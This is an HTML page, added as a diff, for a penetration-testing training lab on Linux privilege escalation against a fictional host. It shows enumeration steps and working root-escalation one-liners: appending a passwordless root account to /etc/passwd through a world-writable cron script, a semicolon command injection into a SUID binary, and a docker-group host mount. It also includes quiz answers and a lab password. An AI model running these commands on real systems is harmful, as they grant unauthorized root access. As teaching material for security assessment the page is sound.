@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lab F8-A: Linux Privilege Escalation</title>
+<style>
+  :root {
+    --bg: #0d1117; --surface: #161b22; --surface2: #1c2128; --border: #30363d;
+    --text: #e6edf3; --muted: #8b949e; --accent: #f78166; --green: #3fb950;
+    --blue: #58a6ff; --yellow: #d29922; --purple: #bc8cff; --cyan: #39d353; --red: #f85149;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', system-ui, sans-serif; font-size: 15px; line-height: 1.6; }
+  .header { background: var(--surface); border-bottom: 1px solid var(--border); padding: 20px 32px; display: flex; align-items: center; gap: 16px; }
+  .header-badge { background: var(--red); color: #fff; font-size: 11px; font-weight: 700; padding: 3px 10px; border-radius: 20px; letter-spacing: 0.5px; }
+  .header h1 { font-size: 20px; font-weight: 600; }
+  .header-meta { margin-left: auto; display: flex; gap: 20px; font-size: 13px; color: var(--muted); }
+  .container { max-width: 960px; margin: 0 auto; padding: 32px; }
+  .info-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 28px; }
+  .info-card { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 14px 18px; }
+  .info-card .label { font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px; }
+  .info-card .value { font-size: 15px; font-weight: 600; color: var(--blue); }
+  .section { margin-bottom: 32px; }
+  .section-title { font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; color: var(--muted); margin-bottom: 14px; padding-bottom: 8px; border-bottom: 1px solid var(--border); }
+  .objective-list { list-style: none; }
+  .objective-list li { padding: 8px 0; display: flex; gap: 10px; align-items: flex-start; border-bottom: 1px solid var(--border); font-size: 14px; }
+  .objective-list li:last-child { border-bottom: none; }
+  .obj-num { background: var(--red); color: #fff; font-size: 11px; font-weight: 700; width: 20px; height: 20px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; margin-top: 1px; }
+  .step { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; margin-bottom: 16px; overflow: hidden; }
+  .step-header { padding: 14px 18px; display: flex; align-items: center; gap: 12px; cursor: pointer; user-select: none; }
+  .step-header:hover { background: var(--surface2); }
+  .step-num { background: var(--surface2); border: 1px solid var(--border); color: var(--muted); font-size: 12px; font-weight: 700; width: 28px; height: 28px; border-radius: 6px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+  .step-title { font-weight: 600; font-size: 15px; flex: 1; }
+  .step-arrow { color: var(--muted); font-size: 12px; transition: transform 0.2s; }
+  .step.open .step-arrow { transform: rotate(90deg); }
+  .step-body { padding: 0 18px 18px; display: none; }
+  .step.open .step-body { display: block; }
+  .step-body p { color: var(--muted); font-size: 14px; margin-bottom: 12px; }
+  pre { background: #010409; border: 1px solid var(--border); border-radius: 6px; padding: 14px 16px; overflow-x: auto; font-family: 'Consolas', 'Courier New', monospace; font-size: 13px; line-height: 1.5; margin: 10px 0; position: relative; }
+  .cmd { color: var(--cyan); }
+  .comment { color: var(--muted); font-style: italic; }
+  .out { color: var(--green); }
+  .out-bad { color: var(--red); }
+  .out-warn { color: var(--yellow); }
+  .copy-btn { position: absolute; top: 8px; right: 8px; background: var(--surface2); border: 1px solid var(--border); color: var(--muted); font-size: 11px; padding: 3px 8px; border-radius: 4px; cursor: pointer; }
+  .copy-btn:hover { color: var(--text); }
+  .callout { border-radius: 6px; padding: 12px 16px; margin: 12px 0; font-size: 14px; display: flex; gap: 10px; }
+  .callout.info { background: rgba(88,166,255,0.08); border-left: 3px solid var(--blue); }
+  .callout.warn { background: rgba(210,153,34,0.08); border-left: 3px solid var(--yellow); }
+  .callout.tip { background: rgba(63,185,80,0.08); border-left: 3px solid var(--green); }
+  .callout.danger { background: rgba(248,81,73,0.08); border-left: 3px solid var(--red); }
+  .tag-list { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px; }
+  .tag { background: var(--surface2); border: 1px solid var(--border); color: var(--muted); font-size: 12px; padding: 3px 10px; border-radius: 20px; }
+  .check-item { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; padding: 12px 16px; margin-bottom: 8px; display: flex; align-items: flex-start; gap: 12px; cursor: pointer; }
+  .check-item:hover { border-color: var(--blue); }
+  .check-item input[type=checkbox] { width: 16px; height: 16px; margin-top: 2px; accent-color: var(--green); flex-shrink: 0; cursor: pointer; }
+  .check-item label { font-size: 14px; cursor: pointer; flex: 1; }
+  .check-item.checked label { color: var(--muted); text-decoration: line-through; }
+  .progress-bar { background: var(--surface2); border-radius: 4px; height: 6px; margin: 8px 0 4px; overflow: hidden; }
+  .progress-fill { height: 100%; background: var(--green); border-radius: 4px; transition: width 0.3s; }
+  .progress-label { font-size: 12px; color: var(--muted); }
+  .answer-box { margin-top: 12px; }
+  .answer-box label { font-size: 13px; color: var(--muted); display: block; margin-bottom: 6px; }
+  .answer-box input { background: var(--surface2); border: 1px solid var(--border); color: var(--text); font-family: 'Consolas', monospace; font-size: 13px; padding: 8px 12px; border-radius: 6px; width: 100%; }
+  .answer-box input:focus { outline: none; border-color: var(--blue); }
+  .btn { padding: 9px 20px; border-radius: 6px; border: none; font-size: 14px; font-weight: 600; cursor: pointer; }
+  .btn-primary { background: var(--blue); color: var(--bg); }
+  .btn-sm { padding: 5px 14px; font-size: 13px; }
+  .result-msg { margin-top: 8px; font-size: 13px; padding: 8px 12px; border-radius: 6px; display: none; }
+  .result-msg.correct { background: rgba(63,185,80,0.12); color: var(--green); display: block; }
+  .result-msg.wrong { background: rgba(248,81,73,0.1); color: var(--red); display: block; }
+  .privesc-card { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; margin-bottom: 16px; overflow: hidden; }
+  .privesc-card-header { padding: 14px 18px; background: rgba(248,81,73,0.07); border-bottom: 1px solid var(--border); display: flex; align-items: center; gap: 12px; }
+  .privesc-card-body { padding: 16px 18px; }
+  .privesc-type { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; padding: 3px 8px; border-radius: 4px; background: rgba(248,81,73,0.15); color: var(--red); }
+  table { width: 100%; border-collapse: collapse; font-size: 13px; margin: 10px 0; }
+  th { background: var(--surface2); color: var(--muted); text-align: left; padding: 8px 12px; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+  td { padding: 8px 12px; border-bottom: 1px solid var(--border); }
+  tr:last-child td { border-bottom: none; }
+  .badge { font-size: 11px; padding: 2px 8px; border-radius: 4px; font-weight: 600; }
+  .badge-red { background: rgba(248,81,73,0.15); color: var(--red); }
+  .badge-yellow { background: rgba(210,153,34,0.15); color: var(--yellow); }
+  .badge-green { background: rgba(63,185,80,0.15); color: var(--green); }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="header-badge">MODULE F</div>
+  <h1>Lab F8-A: Linux Privilege Escalation</h1>
+  <div class="header-meta">
+    <span>⏱ 30-40 min</span>
+    <span>🎯 Advanced</span>
+    <span>🖥 SYNTEX-LNX01</span>
+  </div>
+</div>
+
+<div class="container">
+
+  <div class="info-grid">
+    <div class="info-card"><div class="label">Target</div><div class="value">SYNTEX-LNX01</div></div>
+    <div class="info-card"><div class="label">User</div><div class="value">jsmith (low priv)</div></div>
+    <div class="info-card"><div class="label">Syllabus</div><div class="value">F4 - Post-Exploitation</div></div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Lab Overview</div>
+    <p style="font-size:14px;color:var(--muted);margin-bottom:12px;">Privilege escalation is a critical post-exploitation technique. After obtaining low-privilege access, an attacker enumerates the system for misconfigurations that allow elevation to root. This lab covers three distinct privilege escalation paths found on SYNTEX-LNX01. You will identify each vulnerability, understand why it exists, and demonstrate exploitation. On a real CPSA engagement, each path would be a separate High-severity finding.</p>
+    <div class="callout warn">
+      <span>⚠️</span>
+      <div>This lab assumes you have a shell as the <strong>jsmith</strong> user on SYNTEX-LNX01 (password: <strong>Syntex2024!</strong> obtained from the SMB share in Lab F5-A). For CPSA purposes, documenting the vulnerability and its potential impact is sufficient - full exploitation is not always required.</div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Learning Objectives</div>
+    <ul class="objective-list">
+      <li><span class="obj-num">1</span>Enumerate world-writable scripts executed by root cron jobs</li>
+      <li><span class="obj-num">2</span>Identify SUID binaries vulnerable to command injection</li>
+      <li><span class="obj-num">3</span>Understand the privilege escalation risk of the Docker group</li>
+      <li><span class="obj-num">4</span>Document each finding with CVSS-style severity and remediation</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Tools Required</div>
+    <div class="tag-list">
+      <span class="tag">find</span>
+      <span class="tag">crontab</span>
+      <span class="tag">ls</span>
+      <span class="tag">id</span>
+      <span class="tag">docker</span>
+      <span class="tag">strings</span>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Initial Enumeration</div>
+
+    <div class="step open" id="step0">
+      <div class="step-header" onclick="toggleStep('step0')">
+        <div class="step-num">0</div>
+        <div class="step-title">Establish Access and Check Current User</div>
+        <div class="step-arrow">▶</div>
+      </div>
+      <div class="step-body">
+        <p>Start by confirming your current user context before beginning privilege escalation enumeration.</p>
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><span class="comment"># Confirm your current user and groups</span>
+<span class="cmd">id</span>
+<span class="out">uid=1001(jsmith) gid=1001(jsmith) groups=1001(jsmith),999(docker)</span>
+
+<span class="cmd">whoami</span>
+<span class="out">jsmith</span>
+
+<span class="cmd">uname -a</span>
+<span class="out">Linux syntex-lnx01 5.4.0-xxx-generic #xxx-Ubuntu SMP ... x86_64 x86_64 x86_64 GNU/Linux</span></pre>
+        <div class="callout info">
+          <span>ℹ️</span>
+          <div>Note that <strong>jsmith</strong> is already in the <strong>docker</strong> group. This is significant - we'll explore why in Step 3. On CPSA engagements, always run <code>id</code> first to capture group memberships.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Privilege Escalation Path 1: Writable Cron Script</div>
+
+    <div class="privesc-card">
+      <div class="privesc-card-header">
+        <span class="privesc-type">Cron Job</span>
+        <strong style="flex:1;margin-left:8px;">/opt/syntex_maintenance.sh - World-Writable Root Cron</strong>
+        <span class="badge badge-red">Critical</span>
+      </div>
+      <div class="privesc-card-body">
+
+        <div class="step open" id="step1">
+          <div class="step-header" onclick="toggleStep('step1')">
+            <div class="step-num">1</div>
+            <div class="step-title">Find the Cron Job</div>
+            <div class="step-arrow">▶</div>
+          </div>
+          <div class="step-body">
+            <p>Check system-wide cron jobs that run as root.</p>
+            <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><span class="comment"># Check root's crontab</span>
+<span class="cmd">cat /etc/crontab</span>
+
+<span class="comment"># Check cron.d entries</span>
+<span class="cmd">ls -la /etc/cron.d/</span>
+<span class="cmd">cat /etc/cron.d/*</span></pre>
+            <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><span class="out">SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+<span class="out-bad">* * * * * root /opt/syntex_maintenance.sh</span></span></pre>
+            <div class="callout danger">
+              <span>🚨</span>
+              <div>The script <code>/opt/syntex_maintenance.sh</code> runs every minute as <strong>root</strong>. Now we need to check its permissions.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="step" id="step2">
+          <div class="step-header" onclick="toggleStep('step2')">
+            <div class="step-num">2</div>
+            <div class="step-title">Check Script Permissions</div>
+            <div class="step-arrow">▶</div>
+          </div>
+          <div class="step-body">
+            <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><span class="cmd">ls -la /opt/syntex_maintenance.sh</span>
+<span class="out-bad">-rwxrwxrwx 1 root root 156 Oct 18 2024 /opt/syntex_maintenance.sh</span>
+
+<span class="cmd">cat /opt/syntex_maintenance.sh</span>
+<span class="out">#!/bin/bash
+# Syntex maintenance script
+echo "Maintenance run at $(date)" &gt;&gt; /var/log/syntex_maintenance.log
+/usr/bin/find /tmp -mtime +7 -delete</span></pre>
+            <div class="callout danger">
+              <span>🚨</span>
+              <div>Permissions are <strong>-rwxrwxrwx</strong> (777). Any user on the system can overwrite this script. Since it runs as root every minute via cron, overwriting it with a malicious payload would result in root-level code execution.</div>
+            </div>
+            <p>To demonstrate the vulnerability (for documentation purposes), a real attacker would append a reverse shell or add a backdoor user. On a CPSA engagement, document the finding and move on - do not actually exploit unless explicitly in scope.</p>
+            <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><span class="comment"># Example proof-of-concept (demonstrate impact without exploitation):</span>
+<span class="comment"># An attacker could run:</span>
+<span class="out">echo 'root2:x:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd</span>
+<span class="comment"># ...then wait 60 seconds for the cron to execute as root</span>
+<span class="comment"># This would create a second root account with no password</span></pre>
+            <div class="answer-box">
+              <label>What are the octal permissions on the cron script?</label>
+              <input type="text" id="q1" placeholder="e.g. 755" />
+              <button class="btn btn-primary btn-sm" style="margin-top:8px;" onclick="checkAnswer('q1','777','q1-result')">Check</button>
+              <div class="result-msg" id="q1-result"></div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Privilege Escalation Path 2: SUID Binary</div>
+
+    <div class="privesc-card">
+      <div class="privesc-card-header">
+        <span class="privesc-type">SUID</span>
+        <strong style="flex:1;margin-left:8px;">/usr/local/bin/syntex-backup - SUID Command Injection</strong>
+        <span class="badge badge-red">Critical</span>
+      </div>
+      <div class="privesc-card-body">
+
+        <div class="step" id="step3">
+          <div class="step-header" onclick="toggleStep('step3')">
+            <div class="step-num">3</div>
+            <div class="step-title">Find SUID Binaries</div>
+            <div class="step-arrow">▶</div>
+          </div>
+          <div class="step-body">
+            <p>SUID binaries run with the file owner's privileges rather than the caller's. Finding non-standard SUID binaries is a key privesc check.</p>
+            <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><span class="comment"># Find all SUID binaries on the system</span>
+<span class="cmd">find / -perm -4000 -type f 2>/dev/null</span></pre>
+            <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><span class="out">/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/chsh
+<span class="out-warn">/usr/local/bin/syntex-backup</span>
+/bin/mount
+/bin/umount
+/bin/ping</span></pre>
+            <div class="callout warn">
+              <span>⚠️</span>
+              <div><code>/usr/local/bin/syntex-backup</code> is not a standard Linux binary. Any non-standard SUID binary warrants investigation. Standard SUID binaries (passwd, sudo, su, mount, ping) are expected; custom ones rarely are.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="step" id="step4">
+          <div class="step-header" onclick="toggleStep('step4')">
+            <div class="step-num">4</div>
+            <div class="step-title">Analyse the SUID Binary</div>
+            <div class="step-arrow">▶</div>
+          </div>
+          <div class="step-body">
+            <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><span class="cmd">ls -la /usr/local/bin/syntex-backup</span>
+<span class="out-bad">-rwsr-xr-x 1 root root 16832 Oct 18 2024 /usr/local/bin/syntex-backup</span>
+
+<span class="comment"># The 's' in the owner execute position = SUID bit set</span>
+<span class="comment"># This binary runs as root regardless of who executes it</span>
+
+<span class="cmd">strings /usr/local/bin/syntex-backup</span>
+<span class="out">...
+Backup directory: %s
+tar -czf /var/backups/syntex_backup.tar.gz %s
+Backup complete.
+...</span></pre>
+            <div class="callout danger">
+              <span>🚨</span>
+              <div>The binary passes user-supplied input to <code>tar</code> using <code>system()</code> or equivalent without sanitisation. If the binary accepts a directory argument and passes it to the shell, it is vulnerable to command injection via path manipulation or shell metacharacters.</div>
+            </div>
+            <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><span class="comment"># Proof-of-concept - command injection via semicolon (or $() subshell)</span>
+<span class="comment"># An attacker would run:</span>
+<span class="cmd">/usr/local/bin/syntex-backup /tmp; /bin/bash -p</span>
+<span class="comment"># The -p flag preserves the effective UID (root) in bash</span>
+<span class="comment"># This would drop the attacker into a root shell</span></pre>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Privilege Escalation Path 3: Docker Group</div>
+
+    <div class="privesc-card">
+      <div class="privesc-card-header">
+        <span class="privesc-type">Group</span>
+        <strong style="flex:1;margin-left:8px;">Docker Group Membership - Container Escape to Root</strong>
+        <span class="badge badge-red">Critical</span>
+      </div>
+      <div class="privesc-card-body">
+
+        <div class="step" id="step5">
+          <div class="step-header" onclick="toggleStep('step5')">
+            <div class="step-num">5</div>
+            <div class="step-title">Understand the Docker Group Risk</div>
+            <div class="step-arrow">▶</div>
+          </div>
+          <div class="step-body">
+            <p>Being in the docker group is effectively equivalent to having passwordless sudo. Docker can mount the host filesystem into a container, allowing a low-privilege user to read and write root-owned files.</p>
+            <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><span class="comment"># Confirm docker group membership (already seen in 'id' output)</span>
+<span class="cmd">id</span>
+<span class="out">uid=1001(jsmith) gid=1001(jsmith) groups=1001(jsmith),<span class="out-bad">999(docker)</span></span>
+
+<span class="comment"># Check docker daemon is running</span>
+<span class="cmd">docker ps</span>
+<span class="out">CONTAINER ID   IMAGE   COMMAND   CREATED   STATUS   PORTS   NAMES</span></pre>
+            <div class="callout danger">
+              <span>🚨</span>
+              <div>Docker daemon running and accessible to jsmith. The docker group attack technique mounts the host root filesystem into an alpine container, then writes to privileged files (e.g. /etc/passwd or /etc/sudoers) as root from within the container.</div>
+            </div>
+            <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><span class="comment"># Classic docker group privesc - mount host / into container:</span>
+<span class="cmd">docker run -it --rm -v /:/mnt alpine chroot /mnt sh</span>
+<span class="comment"># This gives a root shell with full access to the host filesystem</span>
+<span class="comment"># The container runs as root by default; /mnt is the host's /</span>
+<span class="comment"># chroot into /mnt = operate directly on the host OS as root</span></pre>
+            <div class="callout info">
+              <span>ℹ️</span>
+              <div>This is documented in GTFOBins: <strong>docker</strong> - any member of the docker group can trivially escalate to root. The fix is to remove users from the docker group and use <code>sudo</code> with specific docker commands if needed, or use rootless Docker.</div>
+            </div>
+            <div class="answer-box">
+              <label>What image is used in the classic docker group privesc technique?</label>
+              <input type="text" id="q2" placeholder="Image name" />
+              <button class="btn btn-primary btn-sm" style="margin-top:8px;" onclick="checkAnswer('q2','alpine','q2-result')">Check</button>
+              <div class="result-msg" id="q2-result"></div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Completion Checklist</div>
+    <div id="checklist">
+      <div class="check-item" id="c1"><input type="checkbox" onchange="updateCheck('c1')"><label>Found the root cron job running /opt/syntex_maintenance.sh</label></div>
+      <div class="check-item" id="c2"><input type="checkbox" onchange="updateCheck('c2')"><label>Confirmed world-writable permissions (777) on the cron script</label></div>
+      <div class="check-item" id="c3"><input type="checkbox" onchange="updateCheck('c3')"><label>Enumerated SUID binaries and identified /usr/local/bin/syntex-backup</label></div>
+      <div class="check-item" id="c4"><input type="checkbox" onchange="updateCheck('c4')"><label>Understood the command injection risk in the SUID binary</label></div>
+      <div class="check-item" id="c5"><input type="checkbox" onchange="updateCheck('c5')"><label>Confirmed docker group membership via id command</label></div>
+      <div class="check-item" id="c6"><input type="checkbox" onchange="updateCheck('c6')"><label>Documented all three privesc paths with remediation notes</label></div>
+    </div>
+    <div class="progress-bar"><div class="progress-fill" id="progress-fill" style="width:0%"></div></div>
+    <div class="progress-label" id="progress-label">0 / 6 complete</div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Finding Summary</div>
+    <table>
+      <tr><th>Finding</th><th>Location</th><th>Impact</th><th>Severity</th><th>Remediation</th></tr>
+      <tr>
+        <td>World-writable root cron script</td>
+        <td>/opt/syntex_maintenance.sh</td>
+        <td>Any user can write commands executed as root</td>
+        <td><span class="badge badge-red">Critical</span></td>
+        <td>chmod 700 /opt/syntex_maintenance.sh; chown root:root</td>
+      </tr>
+      <tr>
+        <td>SUID binary command injection</td>
+        <td>/usr/local/bin/syntex-backup</td>
+        <td>User-controlled input passed to shell as root</td>
+        <td><span class="badge badge-red">Critical</span></td>
+        <td>Remove SUID bit; sanitise input; avoid system() calls</td>
+      </tr>
+      <tr>
+        <td>Docker group membership</td>
+        <td>jsmith, guest accounts</td>
+        <td>Equivalent to passwordless root sudo</td>
+        <td><span class="badge badge-red">Critical</span></td>
+        <td>Remove users from docker group; use rootless Docker or sudoers rules</td>
+      </tr>
+    </table>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Knowledge Check</div>
+    <div class="step open" id="kc1">
+      <div class="step-header" onclick="toggleStep('kc1')">
+        <div class="step-num" style="background:var(--purple);color:var(--bg)">?</div>
+        <div class="step-title">What find flag is used to enumerate SUID binaries?</div>
+        <div class="step-arrow">▶</div>
+      </div>
+      <div class="step-body">
+        <div class="answer-box">
+          <input type="text" id="kc1-ans" placeholder="e.g. -perm ..." />
+          <button class="btn btn-primary btn-sm" style="margin-top:8px;" onclick="checkAnswer('kc1-ans','-4000','kc1-result')">Check</button>
+          <div class="result-msg" id="kc1-result"></div>
+        </div>
+      </div>
+    </div>
+    <div class="step" id="kc2">
+      <div class="step-header" onclick="toggleStep('kc2')">
+        <div class="step-num" style="background:var(--purple);color:var(--bg)">?</div>
+        <div class="step-title">How often does the cron job execute the maintenance script?</div>
+        <div class="step-arrow">▶</div>
+      </div>
+      <div class="step-body">
+        <div class="answer-box">
+          <input type="text" id="kc2-ans" placeholder="e.g. every X minutes" />
+          <button class="btn btn-primary btn-sm" style="margin-top:8px;" onclick="checkAnswer('kc2-ans','every minute','kc2-result')">Check</button>
+          <div class="result-msg" id="kc2-result"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+function toggleStep(id) { document.getElementById(id).classList.toggle('open'); }
+function copyPre(btn) {
+  const text = btn.parentElement.innerText.replace('Copy\n','').trim();
+  navigator.clipboard.writeText(text).then(() => { btn.textContent = 'Copied!'; setTimeout(() => btn.textContent = 'Copy', 1500); });
+}
+function checkAnswer(inputId, correct, resultId) {
+  const val = document.getElementById(inputId).value.trim().toLowerCase();
+  const corr = correct.toLowerCase();
+  const el = document.getElementById(resultId);
+  if (val === corr || val.includes(corr) || corr.includes(val)) {
+    el.className = 'result-msg correct'; el.textContent = '✓ Correct';
+  } else {
+    el.className = 'result-msg wrong'; el.textContent = '✗ Not quite - review the step above';
+  }
+}
+function updateCheck(id) {
+  const item = document.getElementById(id);
+  const cb = item.querySelector('input');
+  if (cb.checked) item.classList.add('checked'); else item.classList.remove('checked');
+  const all = document.querySelectorAll('#checklist .check-item input');
+  const done = document.querySelectorAll('#checklist .check-item input:checked').length;
+  document.getElementById('progress-fill').style.width = (done/all.length*100) + '%';
+  document.getElementById('progress-label').textContent = done + ' / ' + all.length + ' complete';
+}
+</script>
+</body>
+</html>
